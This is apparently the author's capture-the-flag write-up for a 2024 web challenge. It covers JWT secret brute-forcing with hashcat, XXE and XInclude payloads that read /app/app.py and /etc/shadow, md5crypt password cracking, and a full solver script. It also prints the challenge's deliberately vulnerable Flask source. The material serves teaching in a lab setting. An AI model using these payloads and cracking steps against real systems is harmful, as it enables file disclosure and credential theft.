# Web: Username

This is a web challenge I created for the WolvSec club CTF event hosted March 2024.

## Description

Please register your username. Have fun!

**Note:** Automated tools like sqlmap and dirbuster are not allowed (and will not be helpful anyway).

**Hint Provided**: The JWT is meant to be cracked. But the secret is not in any word list.

# Initial Analysis

When you go to the challenge page, you are prompted to register your username

Here is the source:

```html
<html>
<head>
    <title>Register</title>
</head>
<h1>Please register your username:</h1>
<form action="/register" method="POST" enctype="application/x-www-form-urlencoded">
    <input type="text" name="username"/>
    <input type="submit" value="Submit" />
</form>
</html>
```

Submitting the form causes the following request/response:

**Request**

```
POST /register HTTP/2
Host: username-okntin33tq-ul.a.run.app
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: https://username-okntin33tq-ul.a.run.app
Referer: https://username-okntin33tq-ul.a.run.app/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=sam
```

**Response**

```
HTTP/2 302 Found
Content-Type: text/html; charset=utf-8
Set-Cookie: appdata=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU; Path=/
Location: /welcome
X-Cloud-Trace-Context: 43f8eebd7a72b2c81f0ead9c4ac2c554;o=1
Date: Sun, 17 Mar 2024 18:19:15 GMT
Server: Google Frontend
Content-Length: 9
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

hello sam
```

Notice two things here:

- an **appdata** cookie is set
- this is a 302 (redirect) response redirecting to `/welcome`

The browser then jumps to the `/welcome` resource which has this request/response:

**/welcome Request**

```
GET /welcome HTTP/2
Host: username-okntin33tq-ul.a.run.app
Cookie: appdata=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://username-okntin33tq-ul.a.run.app/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

```



**/welcome Response**

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: 5959be2418e677ee744754ce01280cb0
Date: Sun, 17 Mar 2024 18:19:15 GMT
Server: Google Frontend
Content-Length: 146
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<html>
<head>
    <title>Welcome</title>
</head>
<h1>Welcome</h1>
<div>Welcome sam</div>
<!-- TODO: Decide if /app/app.py is ok to use -->
</html>
```



Notice

- the cookie (as expected) is sent to the `/welcome` resource.
- the registered name appears in the page response
- there is an HTML comment about /app/app.py

**Note**: Some contestants thought that this comment implied that they could put `/app/app.py` in their browser. It turns out there is an `/app/app.py` on the server and our goal is to eventually read the contents of that file somehow.



## JWT Analysis

Those with more web experience will immediately notice the cookie as a JWT (Jason Web Token).

There are all kinds of resources online to learn more about JWTs.

A dead giveaway is:

- it has three islands of text separated by two periods
- first two islands starts with `eyJ`

A great place to decode a JWT is at https://jwt.io

When you paste the JWT into jwt.io, you'll see something like this:

![image-20240317143303096](./assets/image-20240317143303096.png)

The HEADER on the right is just telling you:

- the signing algorithm is HS256
- it really is a JWT (although this "typ" is optional according to the spec)

This is decoded from the base64 red text on the left: 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**Note**: By design, JWTs never include any trailing ='s like you often see as padding characters in base64.



The PAYLOAD is always JSON.  The PAYLOAD is not encrypted by design.  (so never put anything secret inside it)

In the language of JWTs, this PAYLOAD has one "claim":

```
data: <data><username>sam</username></data> 
```

You can see that the data field is really just a small snippet of XML with "sam" insise the username element.

This is decoded from the purple base64 text on the left:

```
eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9
```



The last section is the SIGNATURE. 

The signature is the aqua text on the left:

```
bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU
```

This is also base64 but it decodes into binary so you can't read it on the right.

jwt.io provides a box on the lower right where, if you know the signing secret then you can enter it.

The idea behind a JWT is there there is some secret that is used to cryptographically create a signature from the HEADER/PAYLOAD. That way, if someone tries to send your website and altered JWT (by hand-editing the PAYLOAD), then they won't know the secret and so the signature they send won't "match" the HEADER/PAYLOAD and your server can reject it.



# Cracking JWTs

If you don't know the secret, but want to find it out anyway, then you have to "crack" the secret.

There are lots of websites that talk about JWT cracking.  There are several possible approaches that all depend on the type of algorithm used to perform the signing.

If the algorithm is HS### (such as our HS256), then after doing some online research, there are only a few options available to try:

- "alg": "none"
  - See the "Removing the signature" section here: https://debricked.com/blog/json-web-tokens/
- Dictionary attack: Looking up the secret in an online word list
- Bruteforce attack: try all 1 character strings, then try all 2 character strings, etc...

See "Cracking weak shared secrets" on this page:

https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e

With some experience, it is easy to try to alg/none attack here but that won't work with this challenge.

Next, you could try the "rockyou" word list (google it) and you'd find that doesn't help either.

That leaves Brute Forcing.

The hint that the JWT secret was not in any word list was released a few hours after the CTF event started based on user feedback.

There are several tools available to help crack JWTs.  Here I'm going to use hashcat.

```
hashcat --potfile-disable -a 3 -m 16500 jwt.txt -O
```

Here are the options explained:

- **--potfile-disable**: hashcat keeps a record of cracked hashes so if you run it a second time "nothing" seems to happen. This option makes it so you can run many times in a row as if it were the "first time"
- **-a 3**: attack mode = **brute force**
- **-m 16500**: tells hashcat that we are trying to crack a JWT
  - If you didn't know this, run `hashcat --help` and it will list the 8 million formats it supports
- **jwt.txt**: the local file containing the full JWT (that you pasted into jwt.io)
- **-O**: optimize (honestly not sure if this actually makes it go faster in practice) 

Running this will cause a bunch of stuff to scroll by.  If it succeeds, you'll see the last bit of text output will look like this:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPGRhdGE-PHVzZXJuYW1lPnNhbTwvdXNlcm5hbWU-PC9kYXRhPiJ9.bo6oHNQHDYUNg4wOgLsd7Ey2aKsNUPopUuDmagLpCEU:mstzt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPG...gLpCEU
Time.Started.....: Sun Mar 17 15:12:24 2024 (7 secs)
Time.Estimated...: Sun Mar 17 15:12:31 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?2?2?2?2 [5]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
Guess.Queue......: 5/15 (33.33%)
Speed.#3.........:  4888.1 kH/s (6.32ms) @ Accel:64 Loops:31 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 36029440/104136192 (34.60%)
Rejected.........: 0/36029440 (0.00%)
Restore.Point....: 580608/1679616 (34.57%)
Restore.Sub.#3...: Salt:0 Amplifier:0-31 Iteration:0-31
Candidate.Engine.: Device Generator
Candidates.#3....: saruk -> 7m3j0
Hardware.Mon.SMC.: Fan0: 33%, Fan1: 33%
Hardware.Mon.#3..: Temp: 58c

Started: Sun Mar 17 15:12:18 2024
Stopped: Sun Mar 17 15:12:32 2024
```

You can see it took about 14 seconds.

You might be wondering WHERE is the secret that it found?

It really is not obvious in this output.

Notice the **mstzt** to the right of the token in the first line of the above output?

That is the HS256 secret!

**Note**: In practice, I personally do try brute forcing on JWTs after first trying alg/none and rockyou.txt.  I tend to let it run at most 20 minutes figuring the author wouldn't want me to spend any more time than that. I understand others might have a different perspective here. This is why the hint was added.

# XML Injection

Now that we know the secret, we can use jwt.io or write python code to generate forged tokens with any PAYLOAD we like.

As an example, here I replaced "sam" with "jane" after putting the secret into the lower-right box.

**Note**: Be sure to clear out the EXISTING text in the lower-right window before you paste in the secret.

![image-20240317153604505](./assets/image-20240317153604505.png)

If you take the forged token on the left and overwrite your existing cookie with this new value, then `/welcome` will say "Welcome jane"

Of course, this doesn't help us.

The experienced contestant will piece together the following facts:

- we are trying to read /app/app.py from the server
- we have the ability to send XML of our choosing to the server and PART of that XML content is echoed back to us

and reasonably consider the following:

- XXE (XML External Entity) attack
- SSTI (Server Side Template Injection)

There are lots of resources online to learn more about these attacks.

If you try SSTI, you will see it does not help.

If you try XXE, here is one resource:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

You might try XML like the following:

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///app/app.py">
]>
<data><username>&file;</username></data>
```

If we make this all one line and deal with quoting escaping, here is what a jwt.io PAYLOAD might look like:

```
{
  "data": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///app/app.py\">]><data><username>&file;</username></data>"
}
```

This produces a JWT like:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiPD94bWwgdmVyc2lvbj1cIjEuMFwiPz48IURPQ1RZUEUgZGF0YSBbPCFFTlRJVFkgZmlsZSBTWVNURU0gXCJmaWxlOi8vL2FwcC9hcHAucHlcIj5dPjxkYXRhPjx1c2VybmFtZT4mZmlsZTs8L3VzZXJuYW1lPjwvZGF0YT4ifQ.A_oxB1nuypCU7nDlHWjlfiBme9Aqvq7kSzsi91cSZFk
```

If we try this as our cookie value we get this: (here I'm using Burp's Repeater functionality)

![image-20240317155705413](./assets/image-20240317155705413.png)

It is telling us that entity references (like the `&file;`) are not allowed.

If we knew XML even better and tried to use something called "Parameter Entitiy" which start with a `%` symbol, we'd find those are not allowed either.



So... what do to???

In the same XXE link above, there is a section labeled: **XInclude attacks**

It turns out this is an alternative approach when XML entities are not allowed.  Or... sometimes XML entities are allowed BUT they are not expanded.

Mimicing the example from this web page, let's try the following attack (all one line):

```
<data><username><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///app/app.py"/></username></data>
```

**Note**: The `parse="text"` is really REALLY important.  It tells the XML processor to NOT try to parse the included content as XML.

Our updated PAYLOAD will be:

```
{
  "data": "<data><username><xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" parse=\"text\" href=\"file:///app/app.py\"/></username></data>"
}
```

If we use jwt.io to forge this token and sent it with Burp Repeater, we get this:

![image-20240317160930297](./assets/image-20240317160930297.png)

We were able to read the `/app/app.py` file!

**Note**: This will be HTML encoded so take this output and find an online HTML decoder.

After HTML decoding, we get this:

```python
import flask
from flask import Flask, render_template, request, url_for
import jwt
from lxml import etree
import os
import re
import tempfile

app = Flask(__name__)

FLAG = os.environ.get('FLAG') or 'wcft{fake-flag}'
FLAGUSER_PASSWORD = os.environ.get('FLAGUSER_PASSWORD') or 'fake-password'

JWT_SECRET = os.environ.get('JWT_SECRET') or 'secret'

JWT_ALG = 'HS256'
JWT_COOKIE = 'appdata'


@app.route('/')
def root():
    return render_template("index.html")


@app.route('/secret-welcome-935734', methods=['GET'])
def secret_welcome():
    # There is a linux user named 'flaguser'
    # Login here with that username and their linux password.
    auth = request.authorization

    if auth is None or auth.username != 'flaguser' or auth.password != FLAGUSER_PASSWORD:
        resp = flask.Response('Please provide the right credentials to get the flag')
        resp.headers['WWW-Authenticate'] = 'Basic'
        return resp, 401

    return f'Congrats, here is your flag: {FLAG}'


@app.route('/welcome', methods=['GET'])
def welcome():
    cookie = request.cookies.get(JWT_COOKIE)

    if not cookie:
        return f'Error: missing {JWT_COOKIE} cookie value'

    try:
        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])
    except:
        return 'Error: unable to decode JWT cookie', 400

    data = jwtData['data']
    if not data:
        return 'Error: missing data field from decoded JWT', 400

    xmlText = str(data)
    if '&' in xmlText:
        return 'Error: No entity references please', 400
    if '%' in xmlText:
        return 'Error: No parameter file entities please', 400

    tmp = tempfile.NamedTemporaryFile()

    # Open the file for writing.
    with open(tmp.name, 'w') as f:
        f.write(xmlText)

    try:
        parser = etree.XMLParser(resolve_entities=False)
        xmlDoc = etree.parse(tmp.name, parser=parser)
        xmlDoc.xinclude()
    except Exception as e:
        print('XML Error:', e)
        return 'Error: Error parsing XML', 400


    usernameElement = xmlDoc.find('username')
    if usernameElement is None:
        return 'Error: Missing username element in XML', 400

    username = usernameElement.text

    return render_template("welcome.html", username=username)


@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username')

    if not username:
        return 'Error: username is required', 400

    username = str(username)

    if not re.match('^[a-z]+$', username):
        return 'Error: username must be only lowercase letters', 400

    if len(username) < 3:
        return 'Error: username must be at least 3 letters', 400

    if len(username) > 20:
        return 'Error: username must be no longer than 20 letters', 400

    # Useful for chal development
    # username = '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="/app/app.py" parse="text"/>'
    xml = f'<data><username>{username}</username></data>'

    jwtData = {"data": xml}

    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)

    response = flask.make_response(f'hello {username}')
    response.set_cookie(JWT_COOKIE, cookie)

    response.headers['location'] = url_for('welcome')
    return response, 302

if __name__ == "__main__":
    app.run(debug=False)

```

# Where is the FLAG?

We can tell from this source code and its comments that:

- the flag is in environment variable named FLAG
- there is a `/secret-welcome-935734` endpoint that will return the flag IF we give it some special username/password

For this who know about Linux, a process' environment is available at a magic file path: `/proc/self/environ`

However, if we try to read this file path like we read `/app/app.py` we get this returned:

```
Error: Error parsing XML
```

This is because `/proc/self/environ` returns a mixture of text and binary data and something about the binary data causes this error even though we `parse="text"`.

Maybe there is some way to read it like this but I don't know how.

That leaves the `/secret-welcome-935734` endpoint.

We see this endpoint wants us to provide basic-auth credentials with:

```
username: flaguser
password: linux password of flag user
```

We know this from these comments:
```python
    # There is a linux user named 'flaguser'
    # Login here with that username and their linux password.
```



# Cracking a Linux Password

How can we learn the password of a Linux user named `flaguser`?

If you google around a bit, you might learn about the `/etc/shadow` file.

If we use our JWT forging powers to read this file we get:

```
Welcome root:*:19764:0:99999:7:::
daemon:*:19764:0:99999:7:::
bin:*:19764:0:99999:7:::
sys:*:19764:0:99999:7:::
sync:*:19764:0:99999:7:::
games:*:19764:0:99999:7:::
man:*:19764:0:99999:7:::
lp:*:19764:0:99999:7:::
mail:*:19764:0:99999:7:::
news:*:19764:0:99999:7:::
uucp:*:19764:0:99999:7:::
proxy:*:19764:0:99999:7:::
www-data:*:19764:0:99999:7:::
backup:*:19764:0:99999:7:::
list:*:19764:0:99999:7:::
irc:*:19764:0:99999:7:::
_apt:*:19764:0:99999:7:::
nobody:*:19764:0:99999:7:::
flaguser:$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:19767:0:99999:7:::
```

Now we need to crack this flaguser hash.

If we check some online resources, we will learn that the actual hash is just part of the above line:

```
$1$hack$BzqsFHqkPjQ2Sn9amFsgN0
```

But what hash format is this in?

While I prefer `hashcat`, one trick I like to use is to let an alternative program called `john` to identify the hash for me.

Let's put this hash in `john.txt` and run:

```
john john.txt
```

The first line that comes out is:
```
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
```

If we run `hashcat --help` and search for `md5crypt` we get:

```
 500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
```

So 500 is the mode we want with `hashcat`.

Just as before, we have the option of using a dictionary or brute forcing.

You can try a file like rockyou.txt but that won't find it.

Next let's try brute forcing:

```
hashcat --potfile-disable -a 3 -m 500 john.txt
```

Similar arguments as before but `-m` is different this time.

This ends with the following output:

```
$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:qqz3

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$hack$BzqsFHqkPjQ2Sn9amFsgN0
Time.Started.....: Sun Mar 17 16:42:37 2024 (45 secs)
Time.Estimated...: Sun Mar 17 16:43:22 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?1?2?2?2 [4]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
Guess.Queue......: 4/15 (26.67%)
Speed.#3.........:    54264 H/s (9.82ms) @ Accel:256 Loops:125 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2453504/2892672 (84.82%)
Rejected.........: 0/2453504 (0.00%)
Restore.Point....: 36864/46656 (79.01%)
Restore.Sub.#3...: Salt:0 Amplifier:40-41 Iteration:875-1000
Candidate.Engine.: Device Generator
Candidates.#3....: qaz3 -> qb4o
Hardware.Mon.SMC.: Fan0: 66%, Fan1: 66%
Hardware.Mon.#3..: Temp: 82c

Started: Sun Mar 17 16:42:29 2024
Stopped: Sun Mar 17 16:43:24 2024
```

This ran in just under one minute and yields the secret: **qqz3**

# Getting the Flag

We can now use a browser to go to the secret endpoint and enter these credentials:

```
username: flaguser
password: qqz3
```

![image-20240317164629924](./assets/image-20240317164629924.png)

and we are given the flag:

```
Congrats, here is your flag: wctf{cr4ck1n_4nd_1nclud1n_4_th3_w1n_1352234}
```

# Solver Script

Here is my solver script:
```python
import html
import jwt
import os
import requests
import subprocess
import sys
import tempfile
from requests.auth import HTTPBasicAuth


URL = os.getenv('CHAL_URL') or 'https://username-okntin33tq-ul.a.run.app'


def getJWT():
    data = {'username': 'sam'}

    url = URL + '/register'
    response = requests.post(url, data = data, allow_redirects = False)

    if response.status_code != 302:
        print(f'Unexpected response from {url}', response.status_code, response.text)
        sys.exit(1)

    jwt = response.cookies.get('appdata')
    if jwt is None:
        print(f'No cookie from {url}')
        sys.exit(1)

    return jwt


def crack(mode, hash):
    file = tempfile.NamedTemporaryFile(delete = False)
    file.write(hash.encode())
    file.close()

    cmd = f'hashcat --potfile-disable -m {mode} -a 3 {file.name} -O'

    output = subprocess.check_output(cmd, shell = True, text = True)
    # print(output)

    if hash not in output:
        print(f'Failed to crack hash ({hash}):', output)
        sys.exit(1)

    hashIndex = output.index(hash + ':')

    keyStart = output[hashIndex:]

    colonIndex = keyStart.index(':')
    newlineIndex = keyStart.index('\n')
    secret = keyStart[colonIndex+1:newlineIndex]
    # print('secret:', secret)

    return secret

def crackJWT(givenJWT):
    HASHCAT_JWT_MODE = 16500
    secret = crack(HASHCAT_JWT_MODE, givenJWT)
    return secret

def crackLinuxPassword(linuxPasswordHash):
    # If you didn't know this mode, one way is to try to solve this using "john".
    # It would identify the hash type and print it out: detected hash type "md5crypt"
    # Then run "hashcat --help" and search for md5crypt to find this mode.
    #
    # Another way: https://hashes.com/en/tools/hash_identifier
    HASHCAT_MD5CRYPT_MODE = 500
    secret = crack(HASHCAT_MD5CRYPT_MODE, linuxPasswordHash)
    return secret

def forgeJWT(jwtSecret, payload):
    jwtJson = {"data": payload}

    forgedJWT = jwt.encode(jwtJson, jwtSecret, algorithm='HS256')

    return forgedJWT


def forgeJWTToReadFile(jwtSecret, filePath):
    xml = f'<data><username><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="{filePath}" parse="text"/></username></data>'
    forgedJWT = forgeJWT(jwtSecret, xml)
    return forgedJWT


def assertWelcomeHasHint(givenJWT):
    url = URL + '/welcome'

    cookies = {'appdata': givenJWT}
    response = requests.get(url, cookies = cookies)

    if '/app/app.py' not in response.text:
        print(f'Hint was not in {url}')
        sys.exit(1)


def readRemoteFile(jwtSecret, filePath):
    url = URL + '/welcome'
    forgedJWT = forgeJWTToReadFile(jwtSecret, filePath)

    cookies = {'appdata': forgedJWT}
    response = requests.get(url, cookies = cookies)

    # print(response.status_code, response.text)

    precedingText = '<div>Welcome '
    if precedingText not in response.text:
        print('1 Unexpected response reading remote file:', response.text)
        sys.exit(1)

    precedingTextIndex = response.text.index(precedingText)

    trailingText = '</div>'
    if trailingText not in response.text:
        print('2 Unexpected response reading remote file:', response.text)
        sys.exit(1)

    trailingTextIndex = response.text.index(trailingText)

    fileContentHtml = response.text[precedingTextIndex+len(precedingText):trailingTextIndex]
    fileContent = html.unescape(fileContentHtml)
    return fileContent


def getLinuxPasswordHash(shadowFileContent):
    prefix = 'flaguser:'
    if prefix not in shadowFileContent:
        print('Cannot find flaguser in shadow file:', shadowFileContent)
        sys.exit(1)

    flaguserIndex = shadowFileContent.index(prefix)
    tailContent = shadowFileContent[flaguserIndex+len(prefix):]
    colonIndex = tailContent.index(':')
    passwordHash = tailContent[0:colonIndex]
    return passwordHash


def getFlag(linuxPassword):
    url = URL + '/secret-welcome-935734'
    response = requests.get(url, auth=HTTPBasicAuth('flaguser', linuxPassword))

    if 'wctf{' in response.text:
        print('SOLVED: username challenge!')
    else:
        print(f'ERROR: failed to get flag from: {url}', response.status_code, response.text)



givenJWT = getJWT()
assertWelcomeHasHint(givenJWT)

jwtSecret = crackJWT(givenJWT)

appFileContent = readRemoteFile(jwtSecret, '/app/app.py')

# proves this endpoint is viewable in app.py
if '/secret-welcome-935734' not in appFileContent:
    print('1 Unexpected app.py content:', appFileContent)
    sys.exit(1)

# proves 'flaguser' is mentioned in app.py
if 'flaguser' not in appFileContent:
    print('2 Unexpected app.py content:', appFileContent)
    sys.exit(1)


# proves it says to find the linux password for 'flaguser'
if 'Login here with that username and their linux password' not in appFileContent:
    print('3 Unexpected app.py content:', appFileContent)
    sys.exit(1)


shadowFileContent = readRemoteFile(jwtSecret, '/etc/shadow')
linuxPasswordHash = getLinuxPasswordHash(shadowFileContent)

print('Have linux password hash, cracking it now. This will take a few mins...')
linuxPassword = crackLinuxPassword(linuxPasswordHash)

getFlag(linuxPassword)
```

